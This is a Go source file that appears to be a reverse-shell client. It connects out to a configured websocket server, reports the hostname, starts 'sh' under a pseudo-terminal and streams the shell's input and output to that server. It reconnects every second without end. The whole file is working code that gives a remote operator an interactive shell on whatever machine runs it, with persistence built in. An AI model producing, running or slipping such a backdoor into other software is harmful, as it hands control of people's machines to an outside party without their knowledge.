package main

import (
	"go_sh_rebound_node/config"
	"go_sh_rebound_node/logger"
	"log"
	"net/http"
	"os"
	"os/exec"
	"slices"
	"time"

	"github.com/creack/pty"
	"github.com/gorilla/websocket"
)

var panicSignal = make(chan struct{})

func main() {
	for {
		run()
		time.Sleep(time.Second)
	}
}
func run() {
	logger.Init()
	config.Init()
	var err error
	c, _, err := websocket.DefaultDialer.Dial(config.ServerWs, http.Header{"authorization": []string{config.Auth}})
	if err != nil {
		log.Println(err)
		return
	}
	defer func() {
		c.Close()
		log.Println("unlink with the server")
	}()
	c.WriteMessage(websocket.BinaryMessage, []byte{0})
	hostname, err := os.Hostname()
	if err != nil {
		log.Println(err)
		return
	}
	c.WriteMessage(websocket.TextMessage, []byte(hostname))
	mt, message, err := c.ReadMessage()
	if err != nil {
		log.Println(err)
		return
	}
	if mt == websocket.BinaryMessage && slices.Equal(message, []byte{0}) {
		log.Println("link to server " + c.RemoteAddr().String())
	}
	mt, message, err = c.ReadMessage()
	if err != nil {
		log.Println(err)
		return
	}
	if mt != websocket.BinaryMessage || !slices.Equal(message, []byte{0}) {
		log.Println("fail to handshake")
		return
	}
	cmd := exec.Command("sh")
	f, err := pty.Start(cmd)
	if err != nil {
		log.Println(err)
		return
	}
	log.Println("start to run sh")
	defer func() {
		f.Close()
		log.Println("exit the sh")
	}()
	c.WriteMessage(websocket.BinaryMessage, []byte{0})
	go func() {
		buf := make([]byte, 1024)
		for {
			n, err := f.Read(buf)
			if err != nil {
				panicSignal <- struct{}{}
				log.Println(err)
				return
			}
			if n > 0 {
				c.WriteMessage(websocket.BinaryMessage, buf[:n])
			}
		}
	}()
	breakFlag := false
	for {
		select {
		case <-panicSignal:
			breakFlag = true
		default:
			mt, message, err = c.ReadMessage()
			if err != nil {
				log.Println(err)
				return
			}
			if mt != websocket.BinaryMessage {
			}
			f.Write(message)
		}
		if breakFlag {
			break
		}
	}
}
